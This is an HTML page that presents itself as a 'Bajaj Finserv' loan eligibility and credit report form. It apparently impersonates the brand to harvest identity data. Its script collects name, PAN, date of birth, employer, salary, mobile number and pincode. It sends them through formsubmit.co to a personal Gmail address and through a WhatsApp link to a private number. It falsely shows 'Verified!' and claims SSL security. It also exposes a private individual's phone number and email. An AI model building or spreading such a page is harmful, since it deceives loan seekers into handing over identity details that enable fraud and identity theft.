<!DOCTYPE html>
<html lang="en">
<head>
<style>
    :root { --bajaj-blue: #0072bc; --light-bg: #f4f7f9; --error-red: #d32f2f; --wa-green: #25d366; }
    .tool-wrapper { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background-color: var(--light-bg); padding: 20px; display: flex; justify-content: center; }
    .credit-card { background: #ffffff; width: 100%; max-width: 480px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); border-top: 6px solid var(--bajaj-blue); overflow: hidden; }
    .card-header { padding: 25px; text-align: center; border-bottom: 1px solid #f0f0f0; }
    .brand { font-size: 26px; font-weight: 800; color: var(--bajaj-blue); text-transform: uppercase; letter-spacing: -1px; }
    .brand span { color: #2ecc71; }
    .form-content { padding: 30px; }
    .input-row { display: flex; gap: 15px; }
    .input-group { margin-bottom: 18px; flex: 1; position: relative; }
    .input-group label { display: block; font-size: 12px; font-weight: 700; color: #555; margin-bottom: 6px; text-transform: uppercase; }
    .input-group input { width: 100%; padding: 12px; border: 1.5px solid #d1d1d1; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
    
    /* Date input specific styling */
    .dob-container { position: relative; display: flex; align-items: center; }
    .dob-container input { padding-right: 40px; }
    .calendar-btn { position: absolute; right: 10px; cursor: pointer; font-size: 18px; color: var(--bajaj-blue); background: none; border: none; }
    
    .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; }
    .submit-btn { width: 100%; padding: 16px; background: var(--bajaj-blue); color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
    
    #successBox { display: none; text-align: center; padding: 40px 20px; }
    .success-icon { font-size: 50px; color: #2ecc71; margin-bottom: 20px; }
    .manager-card { background: #f9f9f9; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px dashed var(--bajaj-blue); }
    .wa-btn { display: inline-block; background: var(--wa-green); color: white; padding: 14px 30px; border-radius: 50px; text-decoration: none; font-weight: 700; margin-top: 10px; box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4); }
    
    #loadingOverlay { display: none; text-align: center; padding: 40px 20px; }
    .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--bajaj-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .secure-info { text-align: center; padding: 15px; font-size: 11px; color: #aaa; background: #fafafa; }
</style>
</head>
<body>

<div class="tool-wrapper">
    <div class="credit-card">
        <div class="card-header">
            <div class="brand">BAJAJ <span>FINSERV</span></div>
            <p>Loan Eligibility & Credit Report</p>
        </div>

        <div class="form-content" id="formBox">
            <form id="loanForm">
                <input type="hidden" name="_template" value="table">
                
                <div class="input-group">
                    <label>Full Name</label>
                    <input type="text" name="Full_Name" id="fullName" placeholder="Enter your full name" required>
                </div>

                <div class="input-row">
                    <div class="input-group">
                        <label>PAN Card Number</label>
                        <input type="text" name="PAN_Number" id="pan" maxlength="10" placeholder="ABCDE1234F" style="text-transform: uppercase;" required>
                        <div class="error-msg" id="panErr">Invalid PAN</div>
                    </div>
                    <div class="input-group">
                        <label>Date of Birth</label>
                        <div class="dob-container">
                            <input type="text" id="dobText" placeholder="DD-MM-YYYY" maxlength="10" required>
                            <input type="date" id="dobPicker" style="position:absolute; width:0; height:0; opacity:0;">
                            <button type="button" class="calendar-btn" onclick="document.getElementById('dobPicker').showPicker()">ðŸ“…</button>
                        </div>
                        <div class="error-msg" id="dobErr">Enter valid DD-MM-YYYY</div>
                    </div>
                </div>

                <div class="input-group">
                    <label>Company Name</label>
                    <input type="text" name="Company_Name" id="company" placeholder="e.g. Tata Motors" required>
                </div>

                <div class="input-group">
                    <label>Monthly Salary</label>
                    <input type="text" name="Monthly_Salary" id="salary" inputmode="numeric" placeholder="â‚¹ Amount" required>
                </div>

                <div class="input-row">
                    <div class="input-group">
                        <label>Mobile Number</label>
                        <input type="tel" name="Mobile" id="mobile" maxlength="10" inputmode="numeric" placeholder="98XXXXXXXX" required>
                        <div class="error-msg" id="mobErr">Invalid Number</div>
                    </div>
                    <div class="input-group">
                        <label>Current Pincode</label>
                        <input type="text" name="Pincode" id="pincode" maxlength="6" inputmode="numeric" placeholder="110001" required>
                    </div>
                </div>

                <button type="submit" class="submit-btn">Check Eligibility</button>
            </form>
        </div>

        <div id="loadingOverlay">
            <div class="spinner"></div>
            <h3 style="color:var(--bajaj-blue);">Analyzing Profile...</h3>
            <p style="font-size:14px; color:#666;">Please wait while we process your request.</p>
        </div>

        <div id="successBox">
            <div class="success-icon">âœ…</div>
            <h2 style="color:#2ecc71; margin:0;">Verified!</h2>
            <p style="color:#666; font-size:14px;">Aapki details process ho chuki hain. Report ke liye manager se sampark karein:</p>
            
            <div class="manager-card">
                <strong>Ankit Rathore</strong><br>
                Sales Manager (Bajaj Finserv)<br>
                <span style="color:var(--bajaj-blue);">9310712068</span>
            </div>
            
            <a href="#" id="waLink" class="wa-btn" target="_blank">
                CONTACT ON WHATSAPP
            </a>
        </div>

        <div class="secure-info">ðŸ”’ Secured with 256-bit SSL Encryption.</div>
    </div>
</div>

<script>
    const form = document.getElementById('loanForm');
    const formBox = document.getElementById('formBox');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const successBox = document.getElementById('successBox');
    const dobText = document.getElementById('dobText');
    const dobPicker = document.getElementById('dobPicker');

    // 1. DOB Manual Entry Mask (DD-MM-YYYY)
    dobText.addEventListener('input', function(e) {
        let v = this.value.replace(/\D/g,'');
        if (v.length > 8) v = v.substring(0,8);
        if (v.length > 4) v = v.substring(0,2) + '-' + v.substring(2,4) + '-' + v.substring(4,8);
        else if (v.length > 2) v = v.substring(0,2) + '-' + v.substring(2,4);
        this.value = v;
    });

    // 2. Sync Calendar Selection to Text Field
    dobPicker.addEventListener('change', function() {
        if (this.value) {
            const [y, m, d] = this.value.split('-');
            dobText.value = `${d}-${m}-${y}`;
        }
    });

    // Other Filters
    document.getElementById('pan').oninput = function() { this.value = this.value.toUpperCase(); };
    ['mobile', 'pincode', 'salary'].forEach(id => {
        document.getElementById(id).oninput = function() { this.value = this.value.replace(/[^0-9]/g, ''); };
    });

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const dobVal = dobText.value;
        const panVal = document.getElementById('pan').value.toUpperCase();
        const mobVal = document.getElementById('mobile').value;
        const nameVal = document.getElementById('fullName').value;
        const compVal = document.getElementById('company').value;
        const salVal = document.getElementById('salary').value;
        const pinVal = document.getElementById('pincode').value;

        const panRegex = /[A-Z]{5}[0-9]{4}[A-Z]{1}/;
        const mobRegex = /^[6-9]\d{9}$/;
        const dateRegex = /^\d{2}-\d{2}-\d{4}$/;

        let isValid = true;
        if(!panRegex.test(panVal)) { document.getElementById('panErr').style.display = 'block'; isValid = false; } 
        else { document.getElementById('panErr').style.display = 'none'; }

        if(!mobRegex.test(mobVal)) { document.getElementById('mobErr').style.display = 'block'; isValid = false; } 
        else { document.getElementById('mobErr').style.display = 'none'; }

        if(!dateRegex.test(dobVal)) { document.getElementById('dobErr').style.display = 'block'; isValid = false; }
        else { document.getElementById('dobErr').style.display = 'none'; }

        if(isValid) {
            formBox.style.display = 'none';
            loadingOverlay.style.display = 'block';

            const waText = `*New Credit Inquiry*%0A------------------%0A*Name:* ${nameVal}%0A*PAN:* ${panVal}%0A*DOB:* ${dobVal}%0A*Company:* ${compVal}%0A*Salary:* â‚¹${salVal}%0A*Mobile:* ${mobVal}%0A*Current Pincode:* ${pinVal}`;
            document.getElementById('waLink').href = `https://wa.me/919310712068?text=${waText}`;

            const formData = new FormData(form);
            formData.append('DOB', dobVal);
            formData.append('_subject', "New Lead: " + nameVal);

            fetch("https://formsubmit.co/ajax/ankitrathor6430@gmail.com", {
                method: "POST",
                body: formData
            })
            .then(() => {
                loadingOverlay.style.display = 'none';
                successBox.style.display = 'block';
            })
            .catch(() => {
                alert("Error submitting. Please try again.");
                formBox.style.display = 'block';
                loadingOverlay.style.display = 'none';
            });
        }
    });
</script>

</body>
</html>